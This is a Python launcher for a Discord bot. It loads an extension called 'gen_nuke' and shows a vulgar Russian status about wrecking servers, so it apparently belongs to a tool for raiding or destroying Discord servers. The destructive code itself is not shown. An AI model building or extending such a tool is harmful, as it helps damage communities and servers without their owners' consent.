import discord
from discord.ext import commands
from config import token

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    await bot.load_extension('cogs.gen_nuke')
    await bot.change_presence(activity=discord.Streaming(name="ВЫЁБЫВАНИЕ СЕРВЕРОВ", url="https://github.com/yaquz"))

bot.run(token)